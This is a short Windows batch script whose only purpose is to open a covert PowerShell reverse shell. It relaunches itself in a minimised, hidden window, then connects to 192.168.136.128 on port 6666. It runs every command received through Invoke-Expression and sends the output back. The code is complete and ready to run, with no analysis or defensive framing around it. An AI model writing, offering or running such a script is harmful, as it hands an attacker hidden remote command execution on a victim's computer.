@echo off
:: Stealth mode - hide window
if not "%1"=="hidden" (
    start /min cmd /c "%~f0" hidden & exit
)

:: Check if PowerShell is available
where powershell >nul 2>&1
if %errorlevel% neq 0 (
    echo PowerShell is required but not found!
    pause
    exit /b
)

:: Create and execute PowerShell reverse shell
set "payload=$client = New-Object System.Net.Sockets.TCPClient('192.168.136.128',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -w hidden -c "%payload%"
